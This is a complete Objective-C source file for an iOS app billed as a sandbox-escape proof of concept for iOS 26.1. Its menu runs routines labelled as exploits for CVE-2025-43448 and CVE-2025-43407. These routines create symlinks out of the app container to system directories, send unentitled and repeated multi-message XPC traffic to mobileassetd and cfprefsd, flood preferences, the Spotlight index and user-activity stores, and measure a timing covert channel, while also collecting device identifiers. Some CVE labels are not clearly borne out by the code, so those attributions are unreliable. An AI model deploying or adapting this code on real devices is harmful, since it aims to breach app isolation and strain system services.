/*
 * SandboxEscapePOC - iOS 26.1 Security Research App
 * 
 * Contains PoC implementations for:
 * - CVE-2025-43448 (CloudKit symlink)
 * - CVE-2025-43407 (Assets entitlements)
 * - cfprefsd XPC exploit patterns
 * - Disk write amplification
 * 
 * For security research only.
 */

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <CoreSpotlight/CoreSpotlight.h>
#import <sys/stat.h>
#import <sys/sysctl.h>
#import <dlfcn.h>

// XPC is available but some APIs are restricted on iOS
#if __has_include(<xpc/xpc.h>)
#import <xpc/xpc.h>
#define XPC_AVAILABLE 1
#else
#define XPC_AVAILABLE 0
#endif

// Forward declarations
@class AppDelegate;
@class ViewController;
@class ExploitEngine;

#pragma mark - Exploit Engine

@interface ExploitEngine : NSObject

// Exploit methods
+ (NSString *)runCloudKitExploit;
+ (NSString *)runAssetsExploit;
+ (NSString *)runCfprefsdExploit;
+ (NSString *)runDiskAmplificationTest;
+ (NSString *)runTimingChannelTest;
+ (NSString *)getSystemInfo;

@end

@implementation ExploitEngine

+ (NSString *)getSystemInfo {
    NSMutableString *info = [NSMutableString string];
    
    UIDevice *device = [UIDevice currentDevice];
    [info appendFormat:@"Device: %@\n", device.model];
    [info appendFormat:@"Name: %@\n", device.name];
    [info appendFormat:@"iOS: %@\n", device.systemVersion];
    [info appendFormat:@"UUID: %@\n", [[device identifierForVendor] UUIDString]];
    
    // Hardware info
    size_t size;
    sysctlbyname("hw.machine", NULL, &size, NULL, 0);
    char *machine = malloc(size);
    sysctlbyname("hw.machine", machine, &size, NULL, 0);
    [info appendFormat:@"HW: %s\n", machine];
    free(machine);
    
    // Memory
    [info appendFormat:@"RAM: %.2f GB\n", 
     [NSProcessInfo processInfo].physicalMemory / (1024.0 * 1024.0 * 1024.0)];
    
    // Sandbox container
    [info appendFormat:@"\nContainer:\n%@\n", NSHomeDirectory()];
    
    return info;
}

#pragma mark - CloudKit Symlink Exploit

+ (NSString *)runCloudKitExploit {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== CloudKit Symlink Exploit (CVE-2025-43448) ===\n\n"];
    
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *container = NSHomeDirectory();
    
    [log appendFormat:@"[*] Container: %@\n", container];
    
    // Test paths outside sandbox
    NSArray *targets = @[
        @"/var/mobile/Library/Preferences",
        @"/var/mobile/Library/Caches",
        @"/var/mobile/Documents",
        @"/private/var/mobile"
    ];
    
    for (NSString *target in targets) {
        NSString *linkPath = [container stringByAppendingPathComponent:
                             [NSString stringWithFormat:@"Documents/escape_%@", 
                              [[target lastPathComponent] stringByReplacingOccurrencesOfString:@"/" withString:@"_"]]];
        
        // Remove existing
        [fm removeItemAtPath:linkPath error:nil];
        
        // Try to create symlink
        NSError *error = nil;
        BOOL success = [fm createSymbolicLinkAtPath:linkPath
                                withDestinationPath:target
                                              error:&error];
        
        if (success) {
            [log appendFormat:@"[+] Created symlink: %@ -> %@\n", 
             [linkPath lastPathComponent], target];
            
            // Try to read through symlink
            NSArray *contents = [fm contentsOfDirectoryAtPath:linkPath error:&error];
            if (contents && contents.count > 0) {
                [log appendFormat:@"    [!] CAN ACCESS! Found %lu items\n", 
                 (unsigned long)contents.count];
                for (NSString *item in [contents subarrayWithRange:NSMakeRange(0, MIN(5, contents.count))]) {
                    [log appendFormat:@"        - %@\n", item];
                }
            } else {
                [log appendFormat:@"    [-] Access denied: %@\n", error.localizedDescription];
            }
        } else {
            [log appendFormat:@"[-] Failed symlink to %@: %@\n", target, error.localizedDescription];
        }
    }
    
    [log appendString:@"\n[*] CloudKit exploit test complete\n"];
    return log;
}

#pragma mark - Assets/mobileassetd Exploit

+ (NSString *)runAssetsExploit {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== Assets Entitlements Bypass (CVE-2025-43407) ===\n\n"];

    // Try to connect to mobileassetd
    void *handle = dlopen("/System/Library/PrivateFrameworks/MobileAsset.framework/MobileAsset", RTLD_NOW);
    if (handle) {
        [log appendString:@"[+] MobileAsset framework loaded\n"];
        dlclose(handle);
    } else {
        [log appendFormat:@"[-] Failed to load MobileAsset framework: %s\n", dlerror()];
    }

#if XPC_AVAILABLE
    // XPC connection attempt
    [log appendString:@"[*] Attempting XPC connection to mobileassetd...\n"];

    xpc_connection_t conn = xpc_connection_create_mach_service(
        "com.apple.mobileassetd",
        NULL,
        0
    );

    if (conn) {
        [log appendString:@"[+] XPC connection handle created\n"];

        xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
            // Event handler - errors logged separately
            (void)event;
        });

        xpc_connection_resume(conn);
        [log appendString:@"[+] Connection resumed\n"];

        // Try query without entitlement
        xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
        if (msg) {
            xpc_dictionary_set_string(msg, "command", "query");
            xpc_dictionary_set_string(msg, "asset-type", "com.apple.MobileAsset.SoftwareUpdate");
            xpc_connection_send_message(conn, msg);
            [log appendString:@"[+] Query message sent\n"];
        }

        // Wait briefly for any response
        [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]];

        xpc_connection_cancel(conn);
        [log appendString:@"[*] Connection test complete\n"];
    } else {
        [log appendString:@"[-] Failed to create XPC connection (sandbox restriction)\n"];
    }
#else
    [log appendString:@"[-] XPC API not available\n"];
#endif

    [log appendString:@"\n[*] Assets exploit test complete\n"];
    return log;
}

#pragma mark - cfprefsd XPC Exploit

+ (NSString *)runCfprefsdExploit {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== cfprefsd XPC Exploit ===\n\n"];

#if XPC_AVAILABLE
    // Test daemon connection (privileged - will fail in sandbox)
    [log appendString:@"[*] Testing cfprefsd.daemon connection...\n"];

    xpc_connection_t daemon = xpc_connection_create_mach_service(
        "com.apple.cfprefsd.daemon",
        NULL,
        XPC_CONNECTION_MACH_SERVICE_PRIVILEGED
    );

    if (daemon) {
        [log appendString:@"[+] Connected to cfprefsd.daemon (privileged)\n"];
        xpc_connection_set_event_handler(daemon, ^(xpc_object_t event) { (void)event; });
        xpc_connection_resume(daemon);
        xpc_connection_cancel(daemon);
    } else {
        [log appendString:@"[-] Cannot connect to daemon (expected in sandbox)\n"];
    }

    // Test agent connection
    [log appendString:@"[*] Testing cfprefsd.agent connection...\n"];

    xpc_connection_t agent = xpc_connection_create_mach_service(
        "com.apple.cfprefsd.agent",
        NULL,
        0
    );

    if (agent) {
        [log appendString:@"[+] Connected to cfprefsd.agent\n"];
        xpc_connection_set_event_handler(agent, ^(xpc_object_t event) { (void)event; });
        xpc_connection_resume(agent);

        // Test multi-message pattern (CVE-2019-7286 style)
        [log appendString:@"[*] Testing multi-message pattern...\n"];

        xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
        if (msg) {
            xpc_dictionary_set_int64(msg, "CFPreferencesOperation", 5);

            xpc_object_t arr = xpc_array_create(NULL, 0);
            if (arr) {
                for (int i = 0; i < 10; i++) {
                    xpc_object_t sub = xpc_dictionary_create(NULL, NULL, 0);
                    if (sub) {
                        xpc_dictionary_set_int64(sub, "CFPreferencesOperation", 4);
                        xpc_dictionary_set_string(sub, "CFPreferencesApplication", "poc.test");
                        xpc_array_append_value(arr, sub);
                    }
                }
                xpc_dictionary_set_value(msg, "CFPreferencesMessages", arr);
            }

            // Send test messages
            for (int i = 0; i < 100; i++) {
                xpc_connection_send_message(agent, msg);
            }
            [log appendFormat:@"[+] Sent %d multi-messages\n", 100];
        }

        xpc_connection_cancel(agent);
    } else {
        [log appendString:@"[-] Cannot connect to agent\n"];
    }
#else
    [log appendString:@"[-] XPC API not available\n"];
#endif

    // Test preference writes (works on iOS)
    [log appendString:@"\n[*] Testing preference write amplification...\n"];

    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();

    for (int i = 0; i < 1000; i++) {
        NSString *key = [NSString stringWithFormat:@"poc_test_%d", i];
        [defaults setObject:@{@"data": [[NSUUID UUID] UUIDString]} forKey:key];
    }
    [defaults synchronize];

    CFAbsoluteTime elapsed = CFAbsoluteTimeGetCurrent() - start;
    [log appendFormat:@"[+] 1000 writes in %.3f seconds (%.1f writes/sec)\n",
     elapsed, 1000.0 / elapsed];

    // Cleanup
    for (int i = 0; i < 1000; i++) {
        [defaults removeObjectForKey:[NSString stringWithFormat:@"poc_test_%d", i]];
    }
    [defaults synchronize];

    [log appendString:@"\n[*] cfprefsd exploit test complete\n"];
    return log;
}

#pragma mark - Disk Amplification Test

+ (NSString *)runDiskAmplificationTest {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== Disk Write Amplification Test ===\n\n"];
    
    // Test 1: NSUserDefaults flood
    [log appendString:@"[*] Test 1: NSUserDefaults flood\n"];
    
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
    NSUInteger totalBytes = 0;
    
    for (int i = 0; i < 500; i++) {
        @autoreleasepool {
            NSMutableDictionary *largeDict = [NSMutableDictionary dictionary];
            for (int j = 0; j < 50; j++) {
                largeDict[[NSString stringWithFormat:@"field_%d", j]] = [[NSUUID UUID] UUIDString];
            }
            totalBytes += 50 * 36; // UUID string length
            
            [defaults setObject:largeDict 
                         forKey:[NSString stringWithFormat:@"flood_%d", i]];
            
            if (i % 100 == 0) {
                [defaults synchronize];
            }
        }
    }
    [defaults synchronize];
    
    CFAbsoluteTime elapsed = CFAbsoluteTimeGetCurrent() - start;
    [log appendFormat:@"[+] Wrote ~%lu KB in %.2f sec (%.1f KB/sec)\n",
     (unsigned long)(totalBytes / 1024), elapsed, (totalBytes / 1024.0) / elapsed];
    
    // Cleanup
    for (int i = 0; i < 500; i++) {
        [defaults removeObjectForKey:[NSString stringWithFormat:@"flood_%d", i]];
    }
    [defaults synchronize];
    
    // Test 2: Spotlight index flood
    [log appendString:@"\n[*] Test 2: Spotlight index flood\n"];
    
    CSSearchableIndex *index = [[CSSearchableIndex alloc] initWithName:@"poc_index"];
    NSMutableArray *items = [NSMutableArray array];
    
    start = CFAbsoluteTimeGetCurrent();
    
    for (int i = 0; i < 100; i++) {
        CSSearchableItemAttributeSet *attrs = [[CSSearchableItemAttributeSet alloc]
            initWithItemContentType:@"public.text"];
        attrs.title = [NSString stringWithFormat:@"Test Item %d", i];
        
        NSMutableString *content = [NSMutableString string];
        for (int j = 0; j < 100; j++) {
            [content appendString:[[NSUUID UUID] UUIDString]];
        }
        attrs.contentDescription = content;
        
        CSSearchableItem *item = [[CSSearchableItem alloc]
            initWithUniqueIdentifier:[[NSUUID UUID] UUIDString]
                    domainIdentifier:@"poc.flood"
                        attributeSet:attrs];
        [items addObject:item];
    }
    
    __block BOOL indexComplete = NO;
    [index indexSearchableItems:items completionHandler:^(NSError *error) {
        indexComplete = YES;
        if (error) {
            [log appendFormat:@"[-] Index error: %@\n", error];
        }
    }];

    // Wait for indexing with timeout
    CFAbsoluteTime timeout = CFAbsoluteTimeGetCurrent() + 10.0; // 10 second timeout
    while (!indexComplete && CFAbsoluteTimeGetCurrent() < timeout) {
        [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1]];
    }
    if (!indexComplete) {
        [log appendString:@"[-] Indexing timed out\n"];
    }
    
    elapsed = CFAbsoluteTimeGetCurrent() - start;
    [log appendFormat:@"[+] Indexed %lu items in %.2f sec\n", (unsigned long)items.count, elapsed];
    
    // Cleanup
    [index deleteSearchableItemsWithDomainIdentifiers:@[@"poc.flood"] completionHandler:nil];
    
    // Test 3: UserActivity flood
    [log appendString:@"\n[*] Test 3: NSUserActivity flood (Biome)\n"];
    
    NSMutableArray *activities = [NSMutableArray array];
    start = CFAbsoluteTimeGetCurrent();
    
    for (int i = 0; i < 50; i++) {
        NSUserActivity *activity = [[NSUserActivity alloc]
            initWithActivityType:[NSString stringWithFormat:@"com.poc.activity%d", i]];
        activity.title = [NSString stringWithFormat:@"Activity %d", i];
        activity.eligibleForSearch = YES;
        activity.eligibleForPrediction = YES;
        
        NSMutableDictionary *info = [NSMutableDictionary dictionary];
        for (int j = 0; j < 20; j++) {
            info[[NSString stringWithFormat:@"key_%d", j]] = [[NSUUID UUID] UUIDString];
        }
        activity.userInfo = info;
        
        [activity becomeCurrent];
        [activities addObject:activity];
    }
    
    elapsed = CFAbsoluteTimeGetCurrent() - start;
    [log appendFormat:@"[+] Created %lu activities in %.2f sec\n", 
     (unsigned long)activities.count, elapsed];
    
    // Cleanup
    for (NSUserActivity *act in activities) {
        [act invalidate];
    }
    
    [log appendString:@"\n[*] Disk amplification test complete\n"];
    return log;
}

#pragma mark - Timing Channel Test

+ (NSString *)runTimingChannelTest {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== Timing Side-Channel Test ===\n\n"];
    
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    
    // Calibration
    [log appendString:@"[*] Calibrating baseline latency...\n"];
    
    double totalLatency = 0;
    int samples = 100;
    
    for (int i = 0; i < samples; i++) {
        CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
        [defaults objectForKey:@"calibration_key"];
        totalLatency += CFAbsoluteTimeGetCurrent() - start;
    }
    
    double baselineLatency = totalLatency / samples;
    [log appendFormat:@"[+] Baseline: %.6f seconds\n", baselineLatency];
    
    // Test timing variation with disk activity
    [log appendString:@"\n[*] Testing timing variation during disk writes...\n"];
    
    NSMutableArray *readLatencies = [NSMutableArray array];
    NSMutableArray *writeLatencies = [NSMutableArray array];
    
    for (int i = 0; i < 50; i++) {
        // Read timing
        CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
        [defaults objectForKey:@"timing_probe"];
        double readTime = CFAbsoluteTimeGetCurrent() - start;
        [readLatencies addObject:@(readTime)];
        
        // Write and measure
        start = CFAbsoluteTimeGetCurrent();
        [defaults setObject:[[NSUUID UUID] UUIDString] forKey:@"timing_write"];
        [defaults synchronize];
        double writeTime = CFAbsoluteTimeGetCurrent() - start;
        [writeLatencies addObject:@(writeTime)];
    }
    
    // Calculate statistics
    double readSum = 0, writeSum = 0;
    for (NSNumber *n in readLatencies) readSum += n.doubleValue;
    for (NSNumber *n in writeLatencies) writeSum += n.doubleValue;
    
    double avgRead = readSum / readLatencies.count;
    double avgWrite = writeSum / writeLatencies.count;
    
    [log appendFormat:@"[+] Avg read latency:  %.6f sec\n", avgRead];
    [log appendFormat:@"[+] Avg write latency: %.6f sec\n", avgWrite];
    [log appendFormat:@"[+] Write/Read ratio:  %.2fx\n", avgWrite / avgRead];
    
    // Covert channel estimation
    double bitPeriod = 0.05; // 50ms
    double bitsPerSecond = 1.0 / bitPeriod;
    [log appendFormat:@"\n[*] Estimated covert channel capacity: %.0f bps\n", bitsPerSecond];
    
    // Cleanup
    [defaults removeObjectForKey:@"timing_write"];
    [defaults synchronize];
    
    [log appendString:@"\n[*] Timing channel test complete\n"];
    return log;
}

@end

#pragma mark - View Controller

@interface ViewController : UIViewController <UITableViewDelegate, UITableViewDataSource>
@property (nonatomic, strong) UITableView *tableView;
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) NSArray *exploits;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    
    self.title = @"iOS 26 Sandbox Escape PoC";
    self.view.backgroundColor = [UIColor systemBackgroundColor];
    
    self.exploits = @[
        @{@"title": @"System Info", @"desc": @"Show device information"},
        @{@"title": @"CloudKit Symlink", @"desc": @"CVE-2025-43448 - Symlink escape"},
        @{@"title": @"Assets Bypass", @"desc": @"CVE-2025-43407 - Entitlements"},
        @{@"title": @"cfprefsd XPC", @"desc": @"XPC multi-message exploit"},
        @{@"title": @"Disk Amplification", @"desc": @"Write amplification test"},
        @{@"title": @"Timing Channel", @"desc": @"Side-channel timing test"},
        @{@"title": @"Run All Tests", @"desc": @"Execute all exploits"}
    ];
    
    // Table view for exploits
    self.tableView = [[UITableView alloc] initWithFrame:CGRectZero style:UITableViewStyleInsetGrouped];
    self.tableView.delegate = self;
    self.tableView.dataSource = self;
    self.tableView.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.tableView];
    
    // Log view
    self.logView = [[UITextView alloc] init];
    self.logView.editable = NO;
    self.logView.font = [UIFont fontWithName:@"Menlo" size:11];
    self.logView.backgroundColor = [UIColor secondarySystemBackgroundColor];
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    self.logView.layer.cornerRadius = 8;
    [self.view addSubview:self.logView];
    
    // Layout
    [NSLayoutConstraint activateConstraints:@[
        [self.tableView.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor],
        [self.tableView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [self.tableView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [self.tableView.heightAnchor constraintEqualToConstant:300],
        
        [self.logView.topAnchor constraintEqualToAnchor:self.tableView.bottomAnchor constant:8],
        [self.logView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:16],
        [self.logView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-16],
        [self.logView.bottomAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.bottomAnchor constant:-8]
    ]];
    
    self.logView.text = @"Select an exploit to run...\n\nThis app tests various sandbox escape techniques for iOS 26.1 security research.";
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
    return self.exploits.count;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:@"cell"];
    if (!cell) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:@"cell"];
    }
    
    NSDictionary *exploit = self.exploits[indexPath.row];
    cell.textLabel.text = exploit[@"title"];
    cell.detailTextLabel.text = exploit[@"desc"];
    cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;
    
    return cell;
}

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
    [tableView deselectRowAtIndexPath:indexPath animated:YES];
    
    self.logView.text = @"Running...\n";
    
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSString *result;
        
        switch (indexPath.row) {
            case 0:
                result = [ExploitEngine getSystemInfo];
                break;
            case 1:
                result = [ExploitEngine runCloudKitExploit];
                break;
            case 2:
                result = [ExploitEngine runAssetsExploit];
                break;
            case 3:
                result = [ExploitEngine runCfprefsdExploit];
                break;
            case 4:
                result = [ExploitEngine runDiskAmplificationTest];
                break;
            case 5:
                result = [ExploitEngine runTimingChannelTest];
                break;
            case 6: {
                NSMutableString *all = [NSMutableString string];
                [all appendString:[ExploitEngine getSystemInfo]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runCloudKitExploit]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runAssetsExploit]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runCfprefsdExploit]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runDiskAmplificationTest]];
                [all appendString:@"\n\n"];
                [all appendString:[ExploitEngine runTimingChannelTest]];
                result = all;
                break;
            }
            default:
                result = @"Unknown exploit";
        }
        
        dispatch_async(dispatch_get_main_queue(), ^{
            self.logView.text = result;
        });
    });
}

- (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section {
    return @"Available Exploits";
}

@end

#pragma mark - App Delegate

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    
    ViewController *vc = [[ViewController alloc] init];
    UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:vc];
    
    self.window.rootViewController = nav;
    [self.window makeKeyAndVisible];
    
    return YES;
}

@end

#pragma mark - Main

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
